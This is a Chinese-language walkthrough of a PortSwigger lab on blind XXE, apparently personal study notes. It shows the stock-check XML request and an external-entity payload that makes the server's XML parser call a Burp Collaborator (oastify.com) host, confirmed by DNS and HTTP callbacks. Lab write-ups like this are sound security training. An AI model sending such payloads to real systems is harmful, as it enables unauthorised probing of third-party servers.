# 实验：带外交互的盲注 XXE

https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction

本实验包含一个“检查库存”（Check stock）功能，该功能会解析 XML 输入，但不显示结果。

你可以通过触发与外部域名的带外交互来检测盲注 XXE 漏洞。

为了解决本实验，请使用外部实体使 XML 解析器向 Burp Collaborator 发起 DNS 查询和 HTTP 请求。

> **注意**
> 为了防止学院平台被用于攻击第三方，我们的防火墙会阻止实验室与任意外部系统之间的交互。为了解决本实验，你必须使用 Burp Collaborator 的默认公共服务器。

## 步骤

探测
- 使用库存查看功能
    ```http
    POST /product/stock HTTP/2

    <?xml version="1.0" encoding="UTF-8"?>
    <stockCheck>
        <productId>
            1
        </productId>
        <storeId>
            1
        </storeId>
    </stockCheck>
    ```
    - 使用 XML 格式

    - 服务器响应
        ```http
        Content-Type: text/plain; charset=utf-8

        838
        ```

- 尝试修改字段，以检查是否存在错误回显
    - 两个字段均无法触发错误回显
    - 仅显示无效或 XML 解析异常

带外测试
- 设置 oast 载荷
    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE example [
        <!ENTITY test SYSTEM "http://id.oastify.com:80/abc.txt">
    ]>
    <stockCheck>
        <productId>
            1&test;
        </productId>
        <storeId>
            1
        </storeId>
    </stockCheck>
    ```
    - 服务器仍显示无效 id，但 oast 服务器收到 DNS 与 HTTP 请求

- 在两个字段引用载荷均成功
- 设置自定义标签后引用
    - 成功
